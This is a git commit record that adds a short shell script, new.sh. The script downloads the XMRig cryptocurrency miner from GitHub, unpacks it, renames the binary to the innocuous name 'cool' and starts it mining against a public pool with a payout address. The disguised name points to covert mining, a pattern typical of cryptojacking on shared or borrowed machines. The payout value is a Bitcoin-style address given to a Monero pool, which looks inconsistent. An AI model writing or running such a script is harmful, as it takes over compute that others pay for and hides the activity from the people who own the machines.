9994143b750e00d99cb3ab6f4a2625109bde84a0
pritam <last@techkeypritam.me>
2024-06-30 03:35:58 +0530

    Create new.sh

---
+++ new.sh
@@ -0,0 +1,2 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-static-x64.tar.gz && tar -xz -f xmrig-6.21.1-linux-static-x64.tar.gz && cd xmrig-6.21.1 && mv xmrig cool && ./cool -o xmrpool.eu:3333 -u 
+bc1ph2rf0msx2d8mq0920p89e5q922xh0l55n7dcpaw4ysad5j56nqnsvtrdm3
